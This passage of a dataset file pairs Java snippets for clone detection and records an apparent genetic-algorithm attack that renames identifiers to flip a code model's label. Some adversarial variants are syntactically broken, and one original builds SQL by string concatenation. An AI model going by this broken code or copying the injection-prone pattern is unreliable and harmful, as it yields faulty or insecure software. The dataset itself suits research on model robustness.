                FileOutputStream resourceCopyStream = new FileOutputStream(resourceFile);
                FileUtil.writeFileToStream(resourceCopyStream, tempResFile, true);
                filename = resourceFile.getName();
            }
            LOG.info(""UploadServlet: resource file name: "" + filename);
            uploadFiles.add(resourceFile);
        } catch (IOException e) {
            LOG.error(""UploadServlet: "" + e.getMessage());
            writeError(request, response, e.getMessage(), paramMap);
            return;
        }
        String editResourceId = paramMap.getValue(HttpParams.UP2P_EDIT_RESOURCE);
        if (editResourceId != null && editResourceId.length() > 0) {
            LOG.debug(""UploadServlet: Got edit resource: "" + editResourceId);
            File editAttach = new File(adapter.getAttachmentStorageDirectory(communityId, editResourceId));
            if (editAttach.exists() && editAttach.isDirectory()) {
                LOG.debug(""UploadServlet: Copying additional attachments from: "" + editAttach.getAbsolutePath());
                for (File oldFile : editAttach.listFiles()) {
                    File newFile = new File(tempUploadDir, oldFile.getName());
                    if (!newFile.exists()) {
                        LOG.debug(""UploadServlet: Copying attachment: "" + oldFile.getAbsolutePath() + "" to "" + newFile.getAbsolutePath());
                        FileOutputStream attachCopyStream = new FileOutputStream(newFile);
                        FileUtil.writeFileToStream(attachCopyStream, oldFile, true);
                    } else {
                        LOG.debug(""UploadServlet: Attachment "" + newFile.getName() + "" explicitly replaced in new upload."");
                    }
                }
            }
        }
        String batchUploadString = paramMap.getValue(HttpParams.UP2P_BATCH);
        boolean batchUpload = batchUploadString != null && batchUploadString.length() > 0;
        if (batchUpload) {
            LOG.info(""UploadSerlvet Recieved batch upload request."");
            File batchFile = new File(adapter.getStorageDirectory(communityId), uploadFiles.get(0).getName());
            uploadFiles.clear();
            LOG.debug(""UploadServlet resource file stored at: "" + batchFile.getPath());
            XMLReader reader = TransformerHelper.getXMLReader();
            reader.setContentHandler(new BatchCopyHandler(communityId, uploadFiles));
            try {
                FileInputStream batchInput = new FileInputStream(batchFile);
                reader.parse(new InputSource(batchInput));
                batchInput.close();
            } catch (Exception e) {
                LOG.error(""UploadServlet: Error parsing batch upload file."");
                LOG.error(""UploadServlet: "" + e.getMessage());
                writeError(request, response, ""Uploaded content was not a valid batch resource file."", paramMap);
                return;
            }
            batchFile.delete();
            adapter.addNotification(""Batch file succesfully processed into "" + uploadFiles.size() + "" resources."");
        }
        boolean pushUpload = paramMap.getValue(HttpParams.UP2P_PUSH) != null && paramMap.getValue(HttpParams.UP2P_PUSH).length() > 0;
        String id = """";
        boolean duplicateResource = false;
        int uploadCount = 0;
        for (int i = 0; i < uploadFiles.size(); i++) {
            LOG.info(""UploadServlet Publishing resource to WebAdapter: "" + uploadFiles.get(i).getName());
            try {
                id = adapter.publish(communityId, new File(uploadFiles.get(i).getName()), tempUploadDir);
                uploadFiles.remove(i);
                i--;
                uploadCount++;
                LOG.info(""UploadServlet Resource published with id: "" + id);
            } catch (IOException e) {
                LOG.warn(""UploadServlet IO Error occured in reading the uploaded file: "" + e.getMessage(), e);
                uploadFilesCleanup(uploadFiles, tempUploadDir);
                writeError(request, response, ""An error occured in reading the uploaded file: "" + e.getMessage(), paramMap);
                return;
            } catch (SAXParseException e) {
                LOG.warn(""UploadServlet SAX Parse Error occured in uploaded resource: "" + e.getMessage());
                String errMsg = ""Invalid XML in the uploaded resource.<br/>"" + e.getMessage() + ""<br/><br/>File location: "" + uploadFiles.get(i).getAbsolutePath() + ""<br/>Line: "" + e.getLineNumber() + "" Column: "" + e.getColumnNumber();
                uploadFilesCleanup(uploadFiles, tempUploadDir);
                writeError(request, response, errMsg, paramMap);
                return;
            } catch (SAXException e) {
                LOG.warn(""UploadServlet Invalid XML in uploaded resource: "" + e.getMessage());
                String errMsg = ""Invalid XML in uploaded resource<br/><i>"" + e.getMessage() + ""</i><br/>"" + ""File location: "" + uploadFiles.get(i).getAbsolutePath();
                uploadFilesCleanup(uploadFiles, tempUploadDir);
                writeError(request, response, errMsg, paramMap);
                return;
            } catch (DuplicateResourceException e) {
                LOG.info(""UploadServlet Duplicate Resource: "" + e.getResourceId() + "" Community: "" + e.getCommunityId());
                if (batchUpload) {
                    if (!duplicateResource) {
                        adapter.addNotification(""Warning: Batch upload contained previously published "" + "" resources which have been discarded."");
                        duplicateResource = true;
                    }
                } else {
                    uploadFilesCleanup(uploadFiles, tempUploadDir);
                    String respondWithXml = paramMap.getValue(HttpParams.UP2P_FETCH_XML);
                    if (respondWithXml != null && respondWithXml.length() > 0) {
                        writeError(request, response, ""This resource is already shared with resource "" + "" id: "" + e.getResourceId(), paramMap);
                        return;
                    }
                    String redirect = response.encodeURL(""/overwrite.jsp?up2p:community="" + e.getCommunityId() + ""&up2p:resource="" + e.getResourceId());
                    LOG.info(""UploadServlet Redirecting to "" + redirect);
                    RequestDispatcher rd = request.getRequestDispatcher(redirect);
                    rd.forward(request, response);
                    return;
                }
            } catch (NetworkAdapterException e) {
                LOG.info(""UploadServlet Error in the Network Adapter for"" + "" community ID "" + communityId, e);
                uploadFilesCleanup(uploadFiles, tempUploadDir);
                writeError(request, response, ""Error in the Network Adapter for this community. <br/>"" + e.getMessage(), paramMap);
                return;
            } catch (ResourceNotFoundException e) {
                LOG.info(""UploadServlet Error Resource not found "" + e);
                uploadFilesCleanup(uploadFiles, tempUploadDir);
                writeError(request, response, ""Error : <br/>"" + e.getMessage(), paramMap);
                return;
            }
        }
        uploadFilesCleanup(uploadFiles, tempUploadDir);
        String ajaxRequest = paramMap.getValue(HttpParams.UP2P_XMLHTTP);
        String respondWithXml = paramMap.getValue(HttpParams.UP2P_FETCH_XML);
        if (respondWithXml != null && respondWithXml.length() > 0) {
            response.setContentType(""text/xml"");
            PrintWriter out = response.getWriter();
            out.println(""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>"");
            out.println(""<upload success=\""true\"" >"");
            out.println(""<resid>"" + id + ""</resid>"");
            out.println(""</upload>"");
        } else if (ajaxRequest != null && ajaxRequest.length() > 0) {
            LOG.debug(""UploadServlet Recieved xmlHttp request, responding with XML"");
            response.setContentType(""text/xml"");
            PrintWriter out = response.getWriter();
            out.println(""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>"");
            out.print(""<resource id=\"""" + request.getParameter(HttpParams.UP2P_RESOURCE) + ""\"" "");
            if (request.getParameter(HttpParams.UP2P_PEERID) != null) {
                out.print(""peerid=\"""" + request.getParameter(HttpParams.UP2P_PEERID) + ""\"" "");
            }
            out.println(""/>"");
        } else if (batchUpload) {
            adapter.addNotification(uploadCount + "" resources were succesfully published."");
            request.setAttribute(""up2p.display.mode"", ""view"");
            String redirect = response.encodeURL(""/view.jsp?up2p:community="" + communityId);
            LOG.info(""UploadServlet Redirecting to "" + redirect);
            RequestDispatcher rd = request.getRequestDispatcher(redirect);
            rd.forward(request, response);
        } else if (!pushUpload) {
            request.setAttribute(""up2p.display.mode"", ""view"");
            String redirect = response.encodeURL(""/view.jsp?up2p:resource="" + id);
            LOG.info(""UploadServlet Redirecting to "" + redirect);
            RequestDispatcher rd = request.getRequestDispatcher(redirect);
            rd.forward(request, response);
        }
        return;
    }
",189,,LABEL_0,LABEL_0,LABEL_0,-1,"client,names,name,ftpFiles,ftpFile",,,,0,,0,GA,1370,0.6586742560068767,failed,[]
271,"    protected String getPasswordHash(String password) {
        MessageDigest md = null;
        try {
            md = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            log.error(""MD5 algorithm not found"", e);
            throw new ServiceException(e);
        }
        md.update(password.getBytes());
        byte[] hash = md.digest();
        StringBuffer buf = new StringBuffer();
        for (int i = 0; i < hash.length; i++) {
            buf.append(Integer.toHexString(hash[i] & 0xff));
        }
        return buf.toString();
    }
 <SPLIT>     private String getHash(String string) {
        Monitor hashTime = JamonMonitorLogger.getTimeMonitor(Cache.class, ""HashTime"").start();
        MessageDigest md5 = null;
        try {
            md5 = MessageDigest.getInstance(""MD5"");
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        md5.reset();
        md5.update(string.getBytes());
        byte[] result = md5.digest();
        StringBuffer hexString = new StringBuffer();
        for (int i = 0; i < result.length; i++) {
            hexString.append(Integer.toHexString(0xFF & result[i]));
        }
        String str = hexString.toString();
        hashTime.stop();
        return str;
    }
",126,,LABEL_1,LABEL_1,LABEL_1,-1,"getPasswordHash,password,md,hash,buf,i",,,,0,,0,GA,2243,0.7971011519432067,failed,[]
272,"    public static Body decodeBody(InputStream in, String contentTransferEncoding) throws IOException {
        if (contentTransferEncoding != null) {
            contentTransferEncoding = MimeUtility.getHeaderParameter(contentTransferEncoding, null);
            if (""quoted-printable"".equalsIgnoreCase(contentTransferEncoding)) {
                in = new QuotedPrintableInputStream(in);
            } else if (""base64"".equalsIgnoreCase(contentTransferEncoding)) {
                in = new Base64InputStream(in);
            }
        }
        BinaryTempFileBody tempBody = new BinaryTempFileBody();
        OutputStream out = tempBody.getOutputStream();
        IOUtils.copy(in, out);
        out.close();
        return tempBody;
    }
 <SPLIT>     private boolean setPayload() throws IOException {
        if (Index < Headers.length) {
            FileOutputStream fos = new FileOutputStream(Headers[Index], true);
            FileInputStream fis = new FileInputStream(HeadlessData);
            FileChannel fic = fis.getChannel();
            FileChannel foc = fos.getChannel();
            fic.transferTo(0, fic.size(), foc);
            fic.close();
            foc.close();
            setDestination(Destinations[Index]);
            setPayload(Headers[Index]);
            Index++;
            return true;
        }
        return false;
    }
",113,"    public static Body decodeBody(InputStream url, String contentTransferEncoding) throws IOException {
        if (contentTransferEncoding != null) {
            contentTransferEncoding = MimeUtility.getHeaderParameter(contentTransferEncoding, null);
            if (""quoted-printable"".equalsIgnoreCase(contentTransferEncoding)) {
                url = new QuotedPrintableInputStream(url);
            } else if (""base64"".equalsIgnoreCase(contentTransferEncoding)) {
                url = new Base64InputStream(url);
            }
        }
        BinaryTempFileBody TempCore = new BinaryTempFileBody();
        OutputStream out = TempCore.getOutputStream();
        IOUtils.copy(url, out);
        out.close();
        return TempCore;
    }
",LABEL_1,LABEL_1,0.6333838105201721,1,"decodeBody,in,contentTransferEncoding,tempBody,out",,,,10,"decodeBody:decodeBody,in:url,contentTransferEncoding:contentTransferEncoding,tempBody:TempCore,out:out,",3,GA,282,0.10109527508417765,ga,[]
273,"    private void doFinishLoadAttachment(long attachmentId) {
        if (attachmentId != mLoadAttachmentId) {
            return;
        }
        Attachment attachment = Attachment.restoreAttachmentWithId(MessageView.this, attachmentId);
        Uri attachmentUri = AttachmentProvider.getAttachmentUri(mAccountId, attachment.mId);
        Uri contentUri = AttachmentProvider.resolveAttachmentIdToContentUri(getContentResolver(), attachmentUri);
        if (mLoadAttachmentSave) {
            try {
                File file = createUniqueFile(Environment.getExternalStorageDirectory(), attachment.mFileName);
                InputStream in = getContentResolver().openInputStream(contentUri);
                OutputStream out = new FileOutputStream(file);
                IOUtils.copy(in, out);
                out.flush();
                out.close();
                in.close();
                Toast.makeText(MessageView.this, String.format(getString(R.string.message_view_status_attachment_saved), file.getName()), Toast.LENGTH_LONG).show();
                new MediaScannerNotifier(this, file, mHandler);
            } catch (IOException ioe) {
                Toast.makeText(MessageView.this, getString(R.string.message_view_status_attachment_not_saved), Toast.LENGTH_LONG).show();
            }
        } else {
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setData(contentUri);
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                startActivity(intent);
            } catch (ActivityNotFoundException e) {
                mHandler.attachmentViewError();
            }
        }
    }
 <SPLIT>     public static ArrayList<RoleName> importRoles(String urlString) {
        ArrayList<RoleName> results = new ArrayList<RoleName>();
        try {
            URL url = new URL(urlString);
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            StringBuffer buff = new StringBuffer();
            String line;
            while ((line = in.readLine()) != null) {
                buff.append(line);
                if (line.equals(""</RoleName>"")) {
                    RoleName name = ProfileParser.parseRoleName(buff.toString());
                    results.add(name);
                    buff = new StringBuffer();
                } else {
                    buff.append(NL);
                }
            }
        } catch (MalformedURLException e) {
        } catch (IOException e) {
        } catch (ParsingException e) {
        }
        return results;
    }
",266,,LABEL_0,LABEL_0,LABEL_0,-1,"doFinishLoadAttachment,attachmentId,attachment,attachmentUri,contentUri,file,in,out,intent",,,,0,,0,GA,3036,1.1205859700838725,failed,[]
274,"    public void testJPEGRaster() throws MalformedURLException, IOException {
        System.out.println(""JPEGCodec RasterImage:"");
        long start = Calendar.getInstance().getTimeInMillis();
        for (int i = 0; i < images.length; i++) {
            String url = Constants.getDefaultURIMediaConnectorBasePath() + ""albums/hund/"" + images[i];
            InputStream istream = (new URL(url)).openStream();
            JPEGImageDecoder dec = JPEGCodec.createJPEGDecoder(istream);
            Raster raster = dec.decodeAsRaster();
            int width = raster.getWidth();
            int height = raster.getHeight();
            istream.close();
            System.out.println(""w: "" + width + "" - h: "" + height);
        }
        long stop = Calendar.getInstance().getTimeInMillis();
        System.out.println(""zeit: "" + (stop - start));
    }
 <SPLIT>     @Override
    public void writeData(byte[] data, byte[] options, boolean transferMetaData) throws Throwable {
        long startTime = System.currentTimeMillis();
        long transferredBytesNum = 0;
        long elapsedTime = 0;
        Properties opts = PropertiesUtils.deserializeProperties(options);
        String server = opts.getProperty(TRANSFER_OPTION_SERVER);
        String username = opts.getProperty(TRANSFER_OPTION_USERNAME);
        String password = opts.getProperty(TRANSFER_OPTION_PASSWORD);
        String filePath = opts.getProperty(TRANSFER_OPTION_FILEPATH);
        if (transferMetaData) {
            int idx = filePath.lastIndexOf(PATH_SEPARATOR);
            if (idx != -1) {
                String fileName = filePath.substring(idx + 1) + META_DATA_FILE_SUFIX;
                filePath = filePath.substring(0, idx);
                filePath = filePath + PATH_SEPARATOR + fileName;
            } else {
                filePath += META_DATA_FILE_SUFIX;
            }
        }
        URL url = new URL(PROTOCOL_PREFIX + username + "":"" + password + ""@"" + server + filePath + "";type=i"");
        URLConnection urlc = url.openConnection(BackEnd.getProxy(Proxy.Type.SOCKS));
        urlc.setConnectTimeout(Preferences.getInstance().preferredTimeOut * 1000);
        urlc.setReadTimeout(Preferences.getInstance().preferredTimeOut * 1000);
        OutputStream os = urlc.getOutputStream();
        ByteArrayInputStream bis = new ByteArrayInputStream(data);
        byte[] buffer = new byte[1024];
        int br;
        while ((br = bis.read(buffer)) > 0) {
            os.write(buffer, 0, br);
            if (!transferMetaData) {
                transferredBytesNum += br;
                elapsedTime = System.currentTimeMillis() - startTime;
                fireOnProgressEvent(transferredBytesNum, elapsedTime);
            }
        }
        bis.close();
        os.close();
    }
",180,,LABEL_0,LABEL_0,LABEL_0,-1,"testJPEGRaster,IOException,start,i,url,istream,dec,raster,width,height,stop",,,,0,,0,GA,3991,1.4735986073811849,failed,[]
275,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     private void copyParseFileToCodeFile() throws IOException {
        InputStream in = new FileInputStream(new File(filenameParse));
        OutputStream out = new FileOutputStream(new File(filenameMisc));
        byte[] buffer = new byte[1024];
        int length;
        while ((length = in.read(buffer)) > 0) out.write(buffer, 0, length);
        in.close();
        out.close();
    }
",194,"    public static boolean decodeFileToFile(String  infilename, String inputpath) {
        boolean success = false;
        java.io.InputStream a = null;
        java.io.OutputStream out = null;
        try {
            in = aw Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream( infilename)), Base64.DECODE);
            ouout new java.io.BufferedOutputStream(new java.io.FileOutputStream(inputpath));
            byte[] url = new byte[65536];
            int connect = -1;
            whilconnectread =connectead(url)) >= 0) {
                out.write(url, 0, connect);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                a.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
",LABEL_1,LABEL_1,0.8489339351654053,1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,8,"decodeFileToFile:decodeFileToFile,infile: infilename,outfile:inputpath,in:a,out:out,buffer:url,read:connect,success:success,",3,GA,402,0.1450211008389791,ga,[]
276,"    public BufferedWriter createOutputStream(String inFile, String outFile) throws IOException {
        int k_blockSize = 1024;
        int byteCount;
        char[] buf = new char[k_blockSize];
        File ofp = new File(outFile);
        ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(ofp));
        zos.setMethod(ZipOutputStream.DEFLATED);
        OutputStreamWriter osw = new OutputStreamWriter(zos, ""ISO-8859-1"");
        BufferedWriter bw = new BufferedWriter(osw);
        ZipEntry zot = null;
        File ifp = new File(inFile);
        ZipInputStream zis = new ZipInputStream(new FileInputStream(ifp));
        InputStreamReader isr = new InputStreamReader(zis, ""ISO-8859-1"");
        BufferedReader br = new BufferedReader(isr);
        ZipEntry zit = null;
        while ((zit = zis.getNextEntry()) != null) {
            if (zit.getName().equals(""content.xml"")) {
                continue;
            }
            zot = new ZipEntry(zit.getName());
            zos.putNextEntry(zot);
            while ((byteCount = br.read(buf, 0, k_blockSize)) >= 0) bw.write(buf, 0, byteCount);
            bw.flush();
            zos.closeEntry();
        }
        zos.putNextEntry(new ZipEntry(""content.xml""));
        bw.flush();
        osw = new OutputStreamWriter(zos, ""UTF8"");
        bw = new BufferedWriter(osw);
        return bw;
    }
 <SPLIT>     public void run() {
        if (status == COMPLETE) {
            return;
        }
        waitRandom();
        RandomAccessFile file = null;
        InputStream inputStream = null;
        boolean success = false;
        URL url = null;
        try {
            BeatportAccessor beatportAccessor = new BeatportAccessor();
            if (sessionCookies == null) {
                sessionCookies = beatportAccessor.getSessionCookies(user, password);
            }
            url = new URL(new BeatportAccessor().getTrackDownloadUrl(downloadId, sessionCookies));
            log.info(""Open (DownloadWorker.run): "" + url);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestProperty(""User-Agent"", BeatportAccessor.userAgent);
            connection.setRequestProperty(""Cookie"", sessionCookies);
            connection.connect();
            if (connection.getResponseCode() / 100 != 2) {
                log.error(""Unexpected response from server: "" + connection.getResponseCode());
                error();
                return;
            }
            if (connection.getContentType().indexOf(""text"") >= 0) {
                log.error(""Tried to request: "" + url.toString());
                log.error(""Unexpected file content type from server: "" + connection.getContentType());
                log.error(""Server replied:\n"" + getContentAsString(connection));
                error();
                return;
            }
            int contentLength = connection.getContentLength();
            if (contentLength < 1) {
                log.error(""Invalid content length: "" + connection.getContentLength());
                error();
                return;
            }
            if (size == -1) {
                size = contentLength;
                stateChanged();
            } else if (size != contentLength) {
                changeTotal(0, contentLength - size);
            }
            if (new File(tmpFileName(fileName)).exists()) {
                if (!new File(tmpFileName(fileName)).delete()) {
                    throw new Exception(""Could not delete file: "" + tmpFileName(fileName));
                }
            }
            file = new RandomAccessFile(tmpFileName(fileName), ""rw"");
            file.seek(downloaded);
            inputStream = connection.getInputStream();
            if (started == 0) {
                started = System.currentTimeMillis();
                time = started;
            }
            statusChangedObserver.statusChanged(status);
            byte buffer[] = new byte[MAX_BUFFER_SIZE];
            while (status == DOWNLOADING) {
                if (size - downloaded < MAX_BUFFER_SIZE) {
                    buffer = new byte[(int) (size - downloaded)];
                }
                int read = inputStream.read(buffer);
                if (read == -1) break;
                file.write(buffer, 0, read);
                downloaded += read;
                changeTotal(read, 0);
                stateChanged();
            }
            if (status == DOWNLOADING) {
                stopped = System.currentTimeMillis();
                status = COMPLETE;
            }
            statusChangedObserver.statusChanged(status);
            stateChanged();
            success = true;
        } catch (Exception e) {
            e.printStackTrace();
            error();
        } finally {
            try {
                file.close();
            } catch (Exception e) {
            }
            if (success) {
                try {
                    if (!new File(tmpFileName(fileName)).renameTo(new File(fileName))) {
                        throw new Exception(""Rename Failed"");
                    }
                } catch (Exception e) {
                    log.error(""Error moving temp file "" + tmpFileName(fileName) + "" file: "" + fileName, e);
                }
            } else {
                try {
                    new File(tmpFileName(fileName)).delete();
                } catch (Exception e) {
                    log.error(""Error deleting erroneous temp file: "" + tmpFileName(fileName), e);
                }
            }
            try {
                inputStream.close();
            } catch (Exception e) {
                log.error(""Error closing input stream of: "" + url + "" / "" + fileName, e);
            }
        }
    }
",279,,LABEL_0,LABEL_0,LABEL_0,-1,"createOutputStream,inFile,outFile,k_blockSize,byteCount,buf,ofp,zos,osw,bw,zot,ifp,zis,isr,br,zit",,,,0,,0,GA,5831,2.2973418911298116,failed,[]
277,"    public static String plainToMD(LoggerCollection loggerCol, String input) {
        byte[] byteHash = null;
        MessageDigest md = null;
        StringBuilder md5result = new StringBuilder();
        try {
            md = MessageDigest.getInstance(""MD5"");
            md.reset();
            md.update(input.getBytes());
            byteHash = md.digest();
            for (int i = 0; i < byteHash.length; i++) {
                md5result.append(Integer.toHexString(0xFF & byteHash[i]));
            }
        } catch (NoSuchAlgorithmException ex) {
            loggerCol.logException(CLASSDEBUG, ""de.searchworkorange.lib.misc.hash.MD5Hash"", Level.FATAL, ex);
        }
        return (md5result.toString());
    }
 <SPLIT>     public boolean actualizarDatosPrevia(int idJugadorDiv, int idRonda, int idPareoRival, int color, int flotante) {
        int intResult = 0;
        String sql = ""UPDATE jugadorxdivxronda "" + "" SET idPareoRival = "" + idPareoRival + "" , color = "" + color + "" , flotante = "" + flotante + "" "" + "" WHERE jugadorxDivision_idJugadorxDivision = "" + idJugadorDiv + "" AND ronda_numeroRonda = "" + idRonda;
        try {
            connection = conexionBD.getConnection();
            connection.setAutoCommit(false);
            ps = connection.prepareStatement(sql);
            intResult = ps.executeUpdate();
            connection.commit();
        } catch (SQLException ex) {
            ex.printStackTrace();
            try {
                connection.rollback();
            } catch (SQLException exe) {
                exe.printStackTrace();
            }
        } finally {
            conexionBD.close(ps);
            conexionBD.close(connection);
        }
        return (intResult > 0);
    }
",141,"    public static String plainToMD(LoggerCollection loggerCol, String connection) {
        byte[] byteHash = null;
        MessageDigest bd = null;
        StringBuilder md5result = new StringBuilder();
        try {
            bd = MessageDigest.getInstance(""MD5"");
            bd.reset();
            md.upbdte(connection.getBytes());
            byteHash = bd.digest();
            for (int i = 0; i < byteHash.length; i++) {
                md5result.append(Integer.toHexString(0xFF & byteHash[i]));
            }
        } catch (NoSuchAlgorithmException ex) {
            loggerCol.logException(CLASSDEBUG, ""de.searchworkorange.lib.misc.hash.MD5Hash"", Level.FATAL, ex);
        }
        return (md5result.toString());
    }
",LABEL_0,LABEL_0,0.5685213208198547,1,"plainToMD,loggerCol,input,byteHash,md,md5result,i",,,,14,"plainToMD:plainToMD,loggerCol:loggerCol,input:connection,byteHash:byteHash,md:bd,md5result:md5result,i:i,",5,GA,367,0.13329609235127768,ga,[]
278,"    public void logging() throws Fault {
        final InterceptorWrapper wrap = new InterceptorWrapper(message);
        final LoggingMessage buffer = new LoggingMessage(""Inbound Message\n----------------------------"");
        String encoding = (String) wrap.getEncoding();
        if (encoding != null) {
            buffer.getEncoding().append(encoding);
        }
        Object headers = wrap.getProtocolHeaders();
        if (headers != null) {
            buffer.getHeader().append(headers);
        }
        InputStream is = (InputStream) wrap.getContent(InputStream.class);
        if (is != null) {
            CachedOutputStream bos = new CachedOutputStream();
            try {
                IOUtils.copy(is, bos);
                bos.flush();
                is.close();
                this.message.setContent(InputStream.class, bos.getInputStream());
                if (bos.getTempFile() != null) {
                    logger.error(""\nMessage (saved to tmp file):\n"");
                    logger.error(""Filename: "" + bos.getTempFile().getAbsolutePath() + ""\n"");
                }
                if (bos.size() > limit) {
                    logger.error(""(message truncated to "" + limit + "" bytes)\n"");
                }
                bos.writeCacheTo(buffer.getPayload(), limit);
                bos.close();
            } catch (IOException e) {
                throw new Fault(e);
            }
        }
        logger.debug(buffer.getPayload().toString().replaceAll(""\r\n|\n|\r"", """"));
    }
 <SPLIT>     public static String postRequest(String urlString, HashMap data) {
        String returnData = """";
        try {
            URL url = new URL(urlString);
            URLConnection connection = url.openConnection();
            connection.setDoOutput(true);
            connection.setDoInput(true);
            PrintWriter out = new PrintWriter(connection.getOutputStream());
            Object[] keySet = data.keySet().toArray();
            Object[] values = data.values().toArray();
            for (int count = 0; count < keySet.length; count++) {
                out.print(URLEncoder.encode((String) keySet[count]) + ""="" + URLEncoder.encode((String) values[count]));
                if ((count + 1) < keySet.length) out.print(""&"");
            }
            out.close();
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                returnData += inputLine;
            }
            in.close();
        } catch (Exception e) {
            e.printStackTrace();
            returnData = null;
        }
        return (returnData);
    }
",294,,LABEL_0,LABEL_0,LABEL_0,-1,"logging,wrap,buffer,encoding,getEncoding,headers,is,bos,e",,,,0,,0,GA,3068,1.1346068183581035,failed,[]
279,"    public String getServerHash(String passwordHash, String PasswordSalt) throws PasswordHashingException {
        byte[] hash;
        try {
            MessageDigest digest = MessageDigest.getInstance(""SHA-256"");
            digest.reset();
            digest.update(PasswordSalt.getBytes(""UTF-16""));
            hash = digest.digest(passwordHash.getBytes(""UTF-16""));
            return bytesToHex(hash);
        } catch (NoSuchAlgorithmException ex) {
            throw new PasswordHashingException(""Current environment does not supply needed security algorithms. Please update Java"");
        } catch (UnsupportedEncodingException ex) {
            throw new PasswordHashingException(""Current environment does not supply needed character encoding. Please update Java"");
        }
    }
 <SPLIT>     public static String getDigest(String user, String realm, String password, String method, String uri, String nonce) {
        String digest1 = user + "":"" + realm + "":"" + password;
        String digest2 = method + "":"" + uri;
        try {
            MessageDigest digestOne = MessageDigest.getInstance(""md5"");
            digestOne.update(digest1.getBytes());
            String hexDigestOne = getHexString(digestOne.digest());
            MessageDigest digestTwo = MessageDigest.getInstance(""md5"");
            digestTwo.update(digest2.getBytes());
            String hexDigestTwo = getHexString(digestTwo.digest());
            String digest3 = hexDigestOne + "":"" + nonce + "":"" + hexDigestTwo;
            MessageDigest digestThree = MessageDigest.getInstance(""md5"");
            digestThree.update(digest3.getBytes());
            String hexDigestThree = getHexString(digestThree.digest());
            return hexDigestThree;
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
",109,,LABEL_1,LABEL_1,LABEL_1,-1,"getServerHash,passwordHash,PasswordSalt,hash,digest",,,,0,,0,GA,1852,0.6627659042676289,failed,[]
280,"    private static boolean genCustRatingFileAndMovieIndexFile(String completePath, String masterFile, String CustRatingFileName, String MovieIndexFileName) {
        try {
            File inFile = new File(completePath + fSep + ""SmartGRAPE"" + fSep + masterFile);
            FileChannel inC = new FileInputStream(inFile).getChannel();
            File outFile1 = new File(completePath + fSep + ""SmartGRAPE"" + fSep + MovieIndexFileName);
            FileChannel outC1 = new FileOutputStream(outFile1, true).getChannel();
            File outFile2 = new File(completePath + fSep + ""SmartGRAPE"" + fSep + CustRatingFileName);
            FileChannel outC2 = new FileOutputStream(outFile2, true).getChannel();
            int fileSize = (int) inC.size();
            int totalNoDataRows = fileSize / 7;
            ByteBuffer mappedBuffer = inC.map(FileChannel.MapMode.READ_ONLY, 0, fileSize);
            int startIndex = 1, count = 0;
            short currentMovie = 1;
            while (mappedBuffer.hasRemaining()) {
                count++;
                short movieName = mappedBuffer.getShort();
                int customer = mappedBuffer.getInt();
                byte rating = mappedBuffer.get();
                if (movieName != currentMovie) {
                    ByteBuffer outBuf1 = ByteBuffer.allocate(10);
                    outBuf1.putShort(currentMovie);
                    outBuf1.putInt(startIndex);
                    outBuf1.putInt(count - 1);
                    outBuf1.flip();
                    outC1.write(outBuf1);
                    currentMovie = movieName;
                    startIndex = count;
                }
                ByteBuffer outBuf2 = ByteBuffer.allocate(5);
                outBuf2.putInt(customer);
                outBuf2.put(rating);
                outBuf2.flip();
                outC2.write(outBuf2);
            }
            ByteBuffer endOfIndexFile = ByteBuffer.allocate(10);
            endOfIndexFile.putShort(currentMovie);
            endOfIndexFile.putInt(startIndex);
            endOfIndexFile.putInt(100480506);
            endOfIndexFile.flip();
            outC1.write(endOfIndexFile);
            outC1.close();
            outC2.close();
            return true;
        } catch (IOException e) {
            System.err.println(e);
            return false;
        }
    }
 <SPLIT>     public String[][] getProjectTreeData() {
        String[][] treeData = null;
        String filename = dms_home + FS + ""temp"" + FS + username + ""adminprojects.xml"";
        String urlString = dms_url + ""/servlet/com.ufnasoft.dms.server.ServerGetAdminProjects"";
        try {
            String urldata = urlString + ""?username="" + URLEncoder.encode(username, ""UTF-8"") + ""&key="" + URLEncoder.encode(key, ""UTF-8"") + ""&filename="" + URLEncoder.encode(username, ""UTF-8"") + ""adminprojects.xml"";
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
            factory.setValidating(false);
            DocumentBuilder parser = factory.newDocumentBuilder();
            URL u = new URL(urldata);
            DataInputStream is = new DataInputStream(u.openStream());
            FileOutputStream os = new FileOutputStream(filename);
            int iBufSize = is.available();
            byte inBuf[] = new byte[20000 * 1024];
            int iNumRead;
            while ((iNumRead = is.read(inBuf, 0, iBufSize)) > 0) os.write(inBuf, 0, iNumRead);
            os.close();
            is.close();
            File f = new File(filename);
            InputStream inputstream = new FileInputStream(f);
            Document document = parser.parse(inputstream);
            NodeList nodelist = document.getElementsByTagName(""proj"");
            int num = nodelist.getLength();
            treeData = new String[num][3];
            for (int i = 0; i < num; i++) {
                treeData[i][0] = new String(DOMUtil.getSimpleElementText((Element) nodelist.item(i), ""pid""));
